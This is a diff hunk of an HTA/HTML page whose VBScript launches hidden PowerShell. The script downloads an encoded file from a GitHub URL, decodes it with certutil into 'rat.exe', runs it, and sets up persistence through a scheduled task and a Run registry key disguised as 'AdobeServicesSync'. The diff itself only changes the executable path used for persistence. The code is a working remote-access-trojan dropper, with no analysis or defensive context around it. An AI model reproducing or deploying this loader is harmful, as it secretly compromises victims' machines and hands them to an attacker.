@@ -2,7 +2,7 @@
 <HEAD> 
 <script language="VBScript">
     Set objShell = CreateObject("Wscript.Shell")
-        objShell.Run ("powershell.exe -nop -w hidden -command Import-Module BitsTransfer; Start-BitsTransfer -Source https://raw.githubusercontent.com/ShilpeshTrivedi/SakalaBoobBoon/master/cmd.txt -Destination ""$env:TEMP\cmd.txt"";Set-Location -Path ""$env:TEMP""; ""C:\Windows\System32\certutil.exe -decode ""$env:TEMP\cmd.txt"" rat.exe""; Start-Process ""$env:TEMP\rat.exe""; ""C:\Windows\System32\schtasks.exe /create /tn ""AdobeServicesSync"" /tr """"$env:TEMP\rat.exe"" //B"""" /sc minute /mo 25"";""cmd /c reg.exe add ""hkcu\software\microsoft\windows\currentversion\run"" /v ""AdobeServicesSync"" /t reg_sz /f /d ""$env:TEMP\rat.exe""",0,true)(window.close)
+        objShell.Run ("powershell.exe -nop -w hidden -command Import-Module BitsTransfer; Start-BitsTransfer -Source https://raw.githubusercontent.com/ShilpeshTrivedi/SakalaBoobBoon/master/cmd.txt -Destination ""$env:TEMP\cmd.txt"";Set-Location -Path ""$env:TEMP""; ""C:\Windows\System32\certutil.exe -decode ""$env:TEMP\cmd.txt"" rat.exe""; Start-Process ""$env:TEMP\rat.exe""; ""C:\Windows\System32\schtasks.exe /create /tn ""AdobeServicesSync"" /tr """"C:\Windows\Temp\rat.exe"" //B"""" /sc minute /mo 25"";""cmd /c reg.exe add ""hkcu\software\microsoft\windows\currentversion\run"" /v ""AdobeServicesSync"" /t reg_sz /f /d ""C:\Windows\Temp\rat.exe""",0,true)(window.close)
 </script>
 </HEAD> 
 <BODY> 
